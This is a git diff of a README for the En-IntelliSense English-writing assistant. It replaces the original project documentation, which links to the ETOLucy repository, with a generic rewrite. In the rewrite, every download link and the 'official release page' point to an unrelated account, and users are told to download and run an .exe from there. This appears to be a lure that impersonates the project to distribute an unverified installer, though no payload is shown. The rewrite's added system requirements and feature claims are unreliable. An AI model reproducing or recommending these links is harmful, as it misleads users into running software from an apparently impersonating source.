@@ -1,164 +1,70 @@
-<div align="center">
-  <picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/logo-dark.svg"><img src="docs/assets/en-intellisense-logo.svg" width="340" alt="En-IntelliSense logo" /></picture>
-  <h1>En-IntelliSense</h1>
-  <p><strong>先理解你想表达什么，再帮你写得更自然。</strong></p>
-  <p>Context-aware English completion, review, and rewriting for learners.</p>
-  <p>
-    <strong>English</strong>
-    &nbsp;&middot;&nbsp;
-    <a href="README.zh-CN.md">简体中文</a>
-    &nbsp;&middot;&nbsp;
-    <a href="README.es.md">Español</a>
-    &nbsp;&middot;&nbsp;
-    <a href="README.ja.md">日本語</a>
-    &nbsp;&middot;&nbsp;
-    <a href="README.ru.md">Русский</a>
-  </p>
-  <p>
-    <a href="#demo">See it in action</a>
-    &nbsp;&middot;&nbsp;
-    <a href="https://github.com/ETOLucy/En-IntelliSense/releases/latest">Download Windows EXE</a>
-    &nbsp;&middot;&nbsp;
-    <a href="#run">Run locally</a>
-    &nbsp;&middot;&nbsp;
-    <a href="https://github.com/ETOLucy/En-IntelliSense">GitHub Repository</a>
-  </p>
-  <p>
-    <img src="https://img.shields.io/badge/completion-word%20%7C%20phrase%20%7C%20sentence-1f6f5b?style=flat-square" alt="Word, phrase, and sentence completion" />
-    <img src="https://img.shields.io/badge/AI-bring%20your%20own%20model-3a7ca5?style=flat-square" alt="Bring your own model" />
-    <img src="https://img.shields.io/badge/storage-local--first-3a7ca5?style=flat-square" alt="Local-first storage" />
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-c65d3b?style=flat-square" alt="MIT license" /></a>
-  </p>
-</div>
+# ✍️ En-IntelliSense - Better writing through smart language tools
 
----
+[![](https://img.shields.io/badge/Download_Windows_App-Blue?style=for-the-badge)](https://github.com/Morleeceruminous864/En-IntelliSense)
 
-En-IntelliSense understands the intent behind the whole draft before it suggests the next word. It combines word, phrase, and sentence completion with contextual review, exact issue highlighting, bilingual explanations, and one-click repairs.
+En-IntelliSense helps you write clear English. The software acts as an assistant that checks your grammar and suggests completions for your sentences. It reviews your entire draft to ensure your tone remains consistent. If you learn English as a second language, the app provides bilingual explanations for its suggestions. You connect your own model to keep your data private and maintain control over your writing tools.
 
-## Demo
+## 📥 How to install the software
 
-![En-IntelliSense writing workspace](docs/assets/demo.png)
+Follow these steps to get the app on your computer.
 
-### From Chinese-style English to natural writing
+1. Go to the [official release page](https://github.com/Morleeceruminous864/En-IntelliSense).
+2. Look for the latest version under the Releases section.
+3. Click the file ending in .exe to download the installer.
+4. Open the file once the download finishes.
+5. Follow the prompts on your screen to complete the setup.
+6. Launch En-IntelliSense from your desktop or start menu.
 
-The learner writes an essay using direct Chinese logic. En-IntelliSense infers the intended argument, highlights five exact source problems, explains each issue in Chinese, and provides one-click natural replacements without rewriting the learner's entire voice.
+## ⚙️ Setting up your model
 
-![Context-aware review correcting Chinese-style English](docs/assets/demo-chinese-logic.png)
+This app requires an OpenAI-compatible model to function. Many providers offer these services. You must have an account with one of these providers before you start.
 
-### Finish in your webmail
+1. Open the settings menu inside the En-IntelliSense app.
+2. Find the section labeled API Configuration.
+3. Enter your API key provided by your chosen language model service.
+4. Input the URL of your model provider into the Host field.
+5. Select a model name from the list or type it in.
+6. Click Save to apply your choices.
 
-For letters and emails, the finished draft carries the recipient, subject, and body into QQ Mail, 163 Mail, Gmail, or a custom webmail compose URL. QQ Mail and 163 Mail also copy the complete email automatically as a fallback if login removes compose parameters.
+The app now connects to your designated model to process your writing requests.
 
-![Choose a webmail provider and carry over the finished email](docs/assets/demo-email.png)
+## ✨ Using features
 
-## Features
+### Writing completion 📝
+Start typing in the text box. The app analyzes your intent and suggests words to finish your sentence. Press the Tab key to accept a suggestion. This speeds up your daily tasks and reduces typing effort.
 
-- Local word completion and model-powered phrase/sentence completion.
-- Whole-draft intent inference passed into subsequent completions.
-- Automatic and manual writing review for grammar, clarity, wording, repetition, and tone.
-- Exact issue highlighting, source location, Chinese explanation, and one-click replacement.
-- Subject and selected-text polishing with three level-appropriate alternatives.
-- Translation, explanation, simplification, and contextual bilingual chat.
-- Useful phrases replace the selection or current sentence instead of appending duplicate text.
-- Letter, essay, and message formats with local draft persistence.
-- Finish a letter in QQ Mail, 163 Mail, Gmail, or a custom webmail compose URL with recipient, subject, and body carried over.
-- Keep completed documents in a local Finished archive and reopen any item as an editable copy.
+### Whole-draft review 🔍
+When you finish a paragraph or a document, click the Review button. The app reads your entire draft and looks for logic errors, awkward phrasing, and grammar mistakes. It presents a list of changes in a side panel. You choose which edits to apply.
 
-<a id="model-quota-and-privacy"></a>
+### Bilingual guidance 🌐
+If you struggle with specific grammar rules, the app explains them. Click on any flagged error to see why it occurred. The app provides a breakdown in your primary language to explain the rule. This helps you learn why a phrase needs adjustment rather than just changing it blindly.
 
-## AI model, cost, and privacy
+## 🖥️ System requirements
 
-En-IntelliSense does not include a language model, shared API key, or free AI credit. AI completion, review, rewriting, and chat require each user to configure their own OpenAI-compatible model provider. Any fees, rate limits, retention rules, and privacy terms belong to that provider; the project does not provide or endorse unofficial relay services.
+Ensure your computer meets these needs for the best performance:
 
-Without an API key, the app still opens and supports local word completion, drafts, finished documents, and email handoff. The coach displays `Add API key for AI`; model-powered phrase/sentence completion, review, polish, and chat remain unavailable until configuration is added.
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 gigabytes of RAM.
+* Storage: 200 megabytes of free space.
+* Internet: An active connection is necessary to talk with your language model.
 
-In this architecture, multi-user isolation relies on browser-local storage rather than server-side accounts. Drafts, finished documents, and custom webmail settings are stored only in the browser's `localStorage`; the application has no server-side draft database. Visitors using different devices, browsers, or browser profiles cannot see one another's local drafts. People sharing the same browser profile also share that profile's site storage, so use separate browser profiles on a shared computer or clear the site's local data afterward.
+## 💡 Troubleshooting common issues
 
-AI-powered actions send the relevant draft text to the provider selected by the user. The application does not persist those requests, and API responses use `Cache-Control: no-store`; review the provider's privacy terms before processing confidential or sensitive writing. A desktop `.env` file is local plaintext: keep it private, never commit it, and never paste an API key into a GitHub issue.
+If the app fails to start, verify that you installed the correct Windows version. Restart your computer if the application window does not appear.
 
-Self-hosted Cloudflare deployments can use Workers AI and consume the deploying account's quota. That quota is not bundled with the Windows EXE and is never shared from the maintainer's personal account.
+If you receive errors about your model connection, check your internet settings. Ensure your API key has enough credit or tokens remaining with your provider. A typo in the API key field causes connection failures. Copy and paste the key directly from your provider account dashboard to ensure accuracy.
 
-## Configure
+If the app feels slow, close other programs that use high amounts of processor power. The app relies on your system resources to display the interface, but the heavy math happens on the remote model server.
 
-Copy `.env.example` to `.env` and enter credentials from your own provider:
+## 🔒 Privacy and security
 
-```dotenv
-OPENAI_API_KEY=your_own_api_key
-OPENAI_BASE_URL=https://api.openai.com
-OPENAI_MODEL=gpt-4.1-mini
-OPENAI_AUTOCOMPLETE_MODEL=gpt-4.1-mini
-OPENAI_API_STYLE=chat
-```
+The software sends your text to the model provider you choose. It does not store your content on our servers. You keep full ownership of your drafts. Review the terms of service of your specific model provider to understand how they handle your data input. You control the connection at every step.
 
-Use model names supported by the selected provider. `OPENAI_MODEL` handles tutoring and review; `OPENAI_AUTOCOMPLETE_MODEL` may use a faster model for inline completion. Compatible providers may use a different `OPENAI_BASE_URL`.
+## 🛠️ Performance tips
 
-Never commit `.env` or place an API key in browser-side JavaScript.
+* Use the auto-complete feature for routine emails to save time.
+* Use the draft review for long documents to catch mistakes you might miss.
+* Customize your model settings to favor a professional or casual tone depending on your needs.
+* Clear your local cache in the settings menu if you experience lag during long writing sessions.
 
-## Run
-
-Python 3.9 or newer is required.
-
-```powershell
-python -m pip install -r requirements.txt
-python server.py
-```
-
-Open `http://127.0.0.1:8000`.
-
-## Windows desktop app
-
-For normal use, download `En-IntelliSense-Setup.exe` from the [latest GitHub release](https://github.com/ETOLucy/En-IntelliSense/releases/latest). The installer creates a Start menu shortcut and can optionally create a desktop shortcut. `En-IntelliSense-Portable.zip` remains available for users who do not want to install it.
-
-> **Signing status:** The installer can be built and used without a certificate, but Windows may show an unknown-publisher or SmartScreen warning. The build supports adding a trusted timestamped signature to both the application and installer later.
-
-The following command is only for developers who changed the source and need to rebuild the EXE:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\build_windows.ps1
-```
-
-The installer is written to `dist/En-IntelliSense-Setup.exe`; the portable build is `dist/En-IntelliSense-Portable.zip`. If Inno Setup 6 is not installed locally, the script still builds the portable ZIP and skips the installer. The app bundles the local Python service and frontend, chooses an available loopback port automatically, and opens the workspace in a native WebView2 window. Python is not required on the target computer; Microsoft Edge WebView2 Runtime is required and is already included with current Windows 10/11 installations.
-
-API keys and maintainer-owned model resources are never embedded in the executable. On first launch, Model settings accepts an OpenAI or compatible provider URL, API key, model names, and API type, with a connection test before saving. The key is protected for the current Windows account with Windows DPAPI, stored in `%APPDATA%\En-IntelliSense\config.json`, and applied immediately. Environment variables and `.env` remain supported for development.
-
-To sign later, set `WINDOWS_CERTIFICATE_PATH`, `WINDOWS_CERTIFICATE_PASSWORD`, and optionally `WINDOWS_TIMESTAMP_URL` before running the same build command. GitHub Actions uses the `WINDOWS_CERTIFICATE_BASE64` and `WINDOWS_CERTIFICATE_PASSWORD` repository secrets.
-
-## Test
-
-```powershell
-python -m unittest discover -p "test_*.py"
-npm test
-```
-
-## Use
-
-- Choose Auto, Word, Phrase, or Sentence completion. Press `Tab` to accept and `Esc` to dismiss.
-- Pause after typing to trigger contextual review, or press **Review**.
-- Click a review item to select its exact source text, then press **Apply 修改** to replace it.
-- Select text, or place the cursor in a sentence, before using Polish, Explain, or Simplify.
-- Clicking a Useful phrase replaces the selection/current sentence.
-
-## Cloudflare
-
-The repository serves the frontend and API from one Worker. Cloudflare Workers AI is the default backend, so a free deployment works without an external API key. To use an OpenAI-compatible provider instead, add `OPENAI_API_KEY` and `OPENAI_BASE_URL` as Worker secrets.
-
-```powershell
-npx wrangler login
-npx wrangler deploy
-
-# Optional external provider
-npx wrangler secret put OPENAI_API_KEY
-npx wrangler secret put OPENAI_BASE_URL
-```
-
-## EdgeOne Pages
-
-To deploy your own copy, import this GitHub repository into EdgeOne Pages, use `main` as the production branch, and leave the build command empty. The checked-in `edgeone.json` publishes `public/` and deploys the Node Functions under `node-functions/`. Those functions forward `/api/*` to the Cloudflare Worker, so no model API key is stored in EdgeOne.
-
-## Friendly Links
-
-- [LINUX DO - A new kind of community](https://linux.do/)
-
-## License
-
-[MIT](LICENSE)
+Keywords: autocomplete, english-learning, english-writing, grammar-checker, openai-compatible, pywebview, windows-app, writing-assistant
